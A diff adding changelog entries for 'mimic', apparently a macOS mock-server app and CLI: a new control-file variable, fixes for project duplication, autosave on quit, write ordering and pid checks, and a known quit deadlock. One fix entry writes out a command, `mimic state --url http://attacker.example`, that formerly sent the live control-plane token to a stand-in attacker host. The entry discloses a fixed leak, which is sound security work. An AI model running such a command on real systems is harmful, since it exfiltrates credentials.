@@ -5,8 +5,89 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added
+
+- **`MIMIC_CONTROL_FILE` relocates the control plane's discovery file**, so a CI job or an end-to-end
+  script can stand an instance up without writing over — or being discovered through — a developer's
+  own `control.json`. The app honours it on both sides: it writes there and searches *only* there,
+  because the override replaces the default search list rather than joining the front of it, and the
+  parent directory is created `0700` on that path too. `mimic` does not read it yet — it links no
+  `ControlPlane` and carries its own copy of the discovery reader — so an isolated run also needs
+  `MIMIC_CONTROL_PORT` (or `MIMIC_CONTROL_URL`) for the destination **and `MIMIC_CONTROL_TOKEN` for
+  the credential**. The port variables carry a destination and no token, and every route — `/health`
+  included — answers `401` without one.
+
 ### Fixed
 
+- **Duplicating a project created nothing, unless the project was empty.** `endpoint.id`,
+  `scenario.id`, `journey.id` and `journeyStep.id` are each a `PRIMARY KEY` on their own table —
+  unique across the database, not scoped to a project — and both hosts built the copy by wrapping a
+  fresh project id around the *source's* endpoints, scenarios, journeys and steps, ids included. The
+  first insert collided with rows the original still owned, GRDB aborted, and the whole write rolled
+  back. It failed silently in both directions: the window treated the throw as non-critical, and the
+  window's control host answers `mimic project duplicate` before the store is touched, so the CLI
+  exited `0`. `MockProject.duplicated(name:)` in `Domain` now remints every identifier in the tree and
+  repoints the two references that aim into it — an endpoint's active scenario, followed by position,
+  and the project's active journey, which would otherwise have dangled and silently deactivated. It is
+  the only implementation: `mimic endpoint duplicate` and `mimic project duplicate` used to disagree
+  about which scenario the copy serves, because the executor pointed a copy at its *first* scenario
+  while the other path followed the *active* one.
+- **Quitting no longer drops the edit you just made.** Autosave debounces by 500 ms, and both exit
+  paths — ⌘Q, and the `SIGTERM` that `mimic app stop` sends — ended the process without writing.
+  `mimic endpoint create` followed immediately by `mimic app stop` is two commands well inside that
+  window, and a script lost the endpoint the first one had just reported creating; silently, because
+  the window that shows "Save failed" is gone by then and the next launch simply reads an older
+  project. Both paths now write the open project before they go, bounded at two seconds so a wedged
+  store cannot hang the quit, and both drop the discovery file *before* that wait — it is credential
+  material, and a flush that runs out its deadline must not leave a live token on disk.
+- **Project-lifecycle commands reach the store in the order they were issued.** Create, duplicate and
+  delete answer before their write lands — that is what makes the window feel immediate — and each was
+  an independent unstructured task with no order between them. `mimic project create Foo` followed by
+  `mimic project delete Foo` is two commands inside one database round trip, and the delete could
+  reach the store first, remove nothing, and let the create's insert land after it and put the project
+  back; `mimic project duplicate Foo` in the same position reported "not found" for a project the
+  caller had just been told was created. The writes are chained now, so they land in the order asked
+  for whatever order the replies arrive in.
+- **A project written by a newer build is refused by name, not reported as missing.** The stored
+  document's `schemaVersion` is checked before a single field is read, and one from ahead of this
+  build throws `PersistenceError.unsupportedSchemaVersion` naming both numbers — the fields this build
+  does not know about are exactly the ones a partial read would drop, and a save afterwards would drop
+  them for good. `project list` still shows it: a project you cannot open is still a project you have,
+  and hiding it looks exactly like the store having lost it.
+- **`mimic app stop` confirms the pid before it signals.** It read a pid out of `control.json` and
+  handed it straight to `kill(2)`; a file left behind by a crashed instance names a pid the system may
+  since have reused, and the `SIGTERM` went to whoever owns it now. The CLI now asks the instance on
+  that file's own port for its state and requires the pid it reports to match. It ignores `--url` for
+  the same reason — a pid only means something on the machine the file was read from. A wedged
+  instance, or one whose file carries no token, can no longer be stopped this way; the refusal names
+  the pid and prints the `kill` to run by hand.
+- **A discovered token goes only to the instance that advertised it.** Destination and credential were
+  resolved independently, so `mimic state --url http://attacker.example` posted this machine's live
+  control-plane token to that host in an `X-Mimic-Token` header. The token from `control.json` is now
+  attached only when the URL's host is loopback *and* its port is the one that file advertised.
+  Reaching an instance through a forwarded port or from a container means setting
+  `MIMIC_CONTROL_TOKEN`, which is the caller naming a credential rather than the CLI guessing one.
+- **Two overlapping control-plane starts no longer strand one of them.** `start` suspends twice before
+  it records the application it built, and an actor admits another call at each suspension, so both
+  callers saw "not running", both bound a port, and the second overwrote the first — which then
+  listened for the life of the process, unreachable by `stop` and with its discovery file replaced. A
+  start arriving while a stop was still closing had the same shape from the other end, and is now a
+  distinct refusal that says to try again rather than one that says a port is in use.
+- **The request log shows what was actually sent.** It recorded the *configured* status while the
+  server serves a clamped one, so a scenario carrying `0` or `999` served `200` or `599` and the
+  traffic list reported `0` or `999` — and it listed response headers that the serving path had
+  refused as invalid, so a header containing a CRLF appeared to have been sent when nothing was. The
+  log is read precisely because the wire cannot be, which is the worst place for the two to disagree.
+- **A project document past 16 KB imports over the control API.** Vapor's default collect limit
+  applies per route, and `projectImport` posts a whole `MockProject` with its captured response bodies
+  in it — roughly eight endpoints' worth. Past that, the request failed before the handler ran and the
+  caller got Vapor's own `413` body instead of a `ControlResponse`, surfacing as an exit-4 `http.413`
+  that no error code explains. The command route now collects up to 4 MB.
+- **Swagger specs that declare `produces` once, at the document level, import as JSON.** The parser
+  read it only from the operation, so those specs — the overwhelming majority — imported as plain
+  text, and with no body either, since the plain-text path short-circuits the JSON body fallback.
+  Every Swagger fixture in the suite happened to declare `produces` inside the operation, which is why
+  two bugs hid behind one convention.
 - **A schema change no longer erases your projects.** `AppMigrations.migrator` set GRDB's
   `eraseDatabaseOnSchemaChange` under `#if DEBUG`, and the app applied that migrator to the real
   store in Application Support. Debug is the configuration every developer runs, so the next
@@ -27,6 +108,9 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   the shared stream, so a later `start()` served traffic and recorded none of it.
 - A locked or unreadable database is no longer reported as "project not found".
 - The request log's method badges no longer share one accessibility identifier per HTTP method.
+- The sidebar's filter field shows a focus ring. `.textFieldStyle(.plain)` discards AppKit's, and
+  nothing replaced it, so tabbing into it changed nothing on screen — which under Full Keyboard
+  Access is not a polish item.
 
 ### Changed
 
@@ -40,7 +124,24 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   were.
 - `Package.resolved` and `Tuist/Package.resolved` are pinned to one set of dependency versions, and
   CI fails if they drift — Linux was testing a Vapor, NIO and GRDB build the installer never shipped.
+  The two were reconciled onto Vapor 4.121.3, NIO 2.97.1 and GRDB 7.10.0; twenty-one shared packages
+  had diverged.
 - Both manifests declare macOS 26, the floor every other artefact already stated.
+
+### Known issues
+
+- **⌘Q waits for the open project's pending edit, but not for a project-lifecycle write still in
+  flight.** `create`, `duplicate`, `delete` and `import` answer before the store has the change, and
+  only the `SIGTERM` path drains them: it is `async` and suspends, leaving the main actor free to run
+  the very writes it is waiting for, while `willTerminate` is posted from inside
+  `NSApplication.terminate` with nowhere left to suspend to, so it has to block the main thread — and
+  a drain awaited from there is a hop onto an actor nothing can service. Draining from both paths is
+  what a first pass at this did, and it deadlocked every quit against its own flush: the full
+  two-second deadline burned, then the edit dropped, worse than the defect it was fixing and green in
+  CI, because nothing in the suite exercises either quit path. The path that cannot drain now says so
+  rather than pretending. The real fix is `applicationShouldTerminate` returning `.terminateLater`,
+  which keeps the runloop alive instead of blocking the thread that has to run the work; it changes
+  the app's termination contract and wants a machine that can actually quit the app to verify it.
 
 ## [0.9.3] — 2026-08-06
 
